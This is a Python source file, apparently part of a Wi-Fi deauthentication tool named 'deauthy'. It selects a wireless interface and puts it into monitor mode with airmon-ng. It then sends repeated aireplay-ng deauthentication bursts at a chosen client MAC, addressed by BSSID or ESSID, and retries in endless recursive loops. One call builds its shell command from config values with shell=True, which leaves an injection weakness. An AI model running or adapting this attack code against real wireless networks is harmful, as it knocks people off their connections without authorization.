from socket import if_nameindex
from deauthy.deauthy_types import Interface, BSSID, ESSID, MAC
from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
import sys
import json
import threading
import time

class Functs:
    def prompt_for_ifaces():
        from deauthy.terminal import Terminal
        white       = Terminal.White
        yellow      = Terminal.Yellow
        bold        = Terminal.Bold
        light_white = Terminal.Light_white
        end         = Terminal.End
        light_blue  = Terminal.Light_blue
        light_green = Terminal.Light_green
        red         = Terminal.Red
        cards = []
        interfaces = {} # type: dict[str, str]
        def gather_ifaces():
            pos = 1
            for ifaces in if_nameindex():
                print(f"{white}[{yellow}{pos}{white}] {white}{ifaces[1]}")
                cards.append(str(pos))
                interfaces[str(pos)] = ifaces[1]
                pos += 1
            return pos-1
        ifaces = gather_ifaces()
        try:
            method = Terminal.prompt(question=f"{light_white}select a network interface. Enter corresponding number {light_blue}({yellow}1{white}-{yellow}{ifaces}{light_blue})", allowed_replies=cards, ending_color=yellow)
            selected_card = interfaces[method]
            return selected_card
        except KeyboardInterrupt:
            print(" ")
            Terminal.inform(msg=f"{light_green}{bold}Goodbye!\n{end}Exiting...")
            exit(0)
        except KeyError:
            print(" ")
            Terminal.inform(msg=f"{red}{bold}Hey! {end}{red}That's not a valid interface! >:(\n{red}{bold}AGAIN!")
            Functs.prompt_for_ifaces()

    def is_in_monitor_mode(card: Interface):
        if card.name.endswith(f"mon") or card.name.endswith(f"1"):
            return True
        return False

    def switch(card: Interface, mode: str):
        """
        Accepts either "monitor" or "managed"
        """
        monsuffix = get_var('monitor_suffix')
        from deauthy.terminal import Terminal
        from deauthy.functs import mod_config
        from halo import Halo
        end = Terminal.End
        def managed():
            with Halo(f"Putting {card.name} into {mode} mode...") as spinner:
                out = check_call(["airmon-ng", "stop", f"{card.name}"], stdout=DEVNULL, stderr=STDOUT)
                if out != 1:
                    spinner.succeed(f"""Done.\n{Terminal.Light_green} + {Terminal.White}"{card.name}" ({mode.upper()})\n{Terminal.Red} - {Terminal.White}"{card.name}" (MONITOR){end}""")
                else:
                    spinner.fail(f"Could not put {card.name} in {mode} mode{end}")

        def monitor():
            with Halo(f"Putting {card.name} into {mode} mode...") as spinner:
                out = check_call(["airmon-ng", "start", f"{card.name}"], stdout=DEVNULL, stderr=STDOUT)
                if out != 1:
                    spinner.succeed(f"""Done.\n{Terminal.Light_green} + {Terminal.White}"{card.name}" ({mode.upper()})\n{Terminal.Red} - {Terminal.White}"{card.name}" (MANAGED){end}""")

                else:
                    spinner.fail(f"Could not put {card.name} in {mode} mode{end}")

            
        modes = {
            "managed":managed,
            "monitor":monitor,
        }
        try:
            modes[mode]()
        except KeyError:
            raise RuntimeError("That's not a valid interface mode.")

    def do_bssid_method(bssid: BSSID):
        from deauthy.functs import get_var
        Functs.BSSID_METHOD.deauth(bssid)
        try:
            Functs.do_bssid_method(bssid)
        except KeyboardInterrupt:
            Functs.switch(card=Interface(get_var('interface')), mode="managed")
            return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            out = check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

    class BSSID_METHOD:
        def deauth(_bssid: BSSID):
            """"""
            bssi = [] # type: list[str]
            chns = [] # type: list[str]
            for key, value in _bssid.bssids.items():
                bssi.append(key)
                chns.append(value)
            
            def ado_bssid_method(bssid_: str):
                try:
                    out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
                    print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
                    if f", but the AP uses channel" in out.decode():
                        print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
                except KeyboardInterrupt:
                    Functs.switch(Interface(get_var('interface')), "managed")
                    return
                except:
                    Functs.BSSID_METHOD.deauth(_bssid=_bssid)
            
            for bssid_aa in bssi:
                ado_bssid_method(bssid_aa)
            Functs.BSSID_METHOD.deauth(_bssid=_bssid)


    class ESSID_METHOD:
        def deauth(eSSID: ESSID):
            """"""
            from deauthy.functs import get_var
            while True:
                current_wiface  = get_var('interface')
                target_mac      = get_var('target_mac')
                channel = eSSID.channel
                Functs.ChannelSys.hopper(channel)
                try:
                    out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
                    print(out)
                    Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
                except KeyboardInterrupt:
                    Functs.switch(Interface(current_wiface), "managed")
                    return

def mod_config(key: str, value):
    with open("deauthy/conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        
    data[key] = value
    with open("deauthy/conf.json", "w+") as jsonfile:
        myJSON = json.dump(data, jsonfile, indent=2)
        jsonfile.close()

def get_var(key: str):
    with open("deauthy/conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        try:
            val = data[key]
            return val
        except KeyError:
            return None
